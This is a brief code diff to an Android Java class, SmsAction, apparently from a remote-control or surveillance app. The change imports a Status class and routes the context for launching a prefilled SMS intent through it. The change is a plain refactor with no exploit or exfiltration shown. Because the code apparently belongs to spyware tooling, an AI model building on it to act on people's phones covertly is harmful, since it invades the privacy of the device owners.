@@ -13,6 +13,7 @@ import java.io.IOException;
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.RCSAndroidGUI;
+import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.DataBuffer;
 import com.ht.RCSAndroidGUI.utils.Utils;
@@ -103,7 +104,7 @@ public class SmsAction extends SubAction {
 		Intent intent = new Intent(Intent.ACTION_VIEW, smsUri);
 		intent.putExtra("sms_body", text);
 		intent.setType("vnd.android-dir/mms-sms");
-		RCSAndroidGUI.getAppContext().startActivity(intent);
+		Status.getAppContext().startActivity(intent);
 		return true;
 	}
 
